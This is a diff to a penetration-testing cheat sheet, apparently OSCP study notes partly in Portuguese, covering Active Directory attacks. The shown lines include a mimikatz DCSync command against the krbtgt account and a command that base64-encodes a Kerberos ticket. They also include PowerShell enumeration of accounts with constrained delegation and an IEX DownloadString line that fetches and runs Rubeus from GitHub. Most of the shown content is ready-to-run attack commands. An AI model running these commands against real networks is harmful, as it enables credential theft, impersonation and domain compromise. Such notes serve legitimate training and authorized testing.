@@ -1402,23 +1402,20 @@ lsadump::dcsync /user:tech\krbtgt
 ```
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\ticket.kirbi")); 
 ```
-
-## CONSTRAINED DELEGATION - RUBEUS
+## CONSTRAINED DELEGATION
 If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
-##### CONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
-```
-curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
-```
-```
-IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
-```
-
-##### CONSTRAINED DELEGATION RUBEUS - FIND COMPUTERS AND USERS WITH CONSTRAINED DELEGATION
+##### CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH CONSTRAINED DELEGATION
 ENCONTRAR APENAS COMPUTADORES
 ```
 $FormatEnumerationLimit=-1
 Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
 Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+```
+ENCONTRAR APENAS USUARIOS
+```
+$FormatEnumerationLimit=-1
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
 ```
 ENCONTRAR COMPUTADORES E USUARIOS
 ```
@@ -1439,6 +1436,7 @@ $FormatEnumerationLimit=-1
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
 Get-DomainUser -TrustedToAuth
 ```
+##### CONSTRAINED DELEGATION (COMPÙTER) - GET THE COMPUTER HASH NTLM
 
 
 
@@ -1450,8 +1448,13 @@ Get-DomainUser -TrustedToAuth
 
 
 
-
-
+##### CONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
+```
 
 
 
